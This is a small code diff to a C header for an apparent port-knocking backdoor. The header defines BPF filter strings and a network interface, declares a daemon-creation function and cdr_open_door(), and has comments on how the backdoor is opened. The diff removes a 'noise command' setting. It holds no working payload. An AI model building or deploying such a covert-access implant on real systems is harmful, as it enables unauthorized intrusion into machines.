@@ -4,7 +4,6 @@
 // #define PORT_KNOCK_LIST // used to determine how to open backdoor
 // #define MAGIC_PORT_STRING
 
-#define CDR_NOISE_COMMAND "noi"
 #define	CDR_BPF_PORT "port "
 #define CDR_BPF_ORCON " or "
 #define CDR_INTERFACE "wlp41s0"
@@ -18,7 +17,7 @@
 struct iphdr;
 struct tcphdr;
 
-void create_deamon_process(char *cdr_noise_command);
+void create_deamon_process();
 
 void cdr_open_door(void);
 
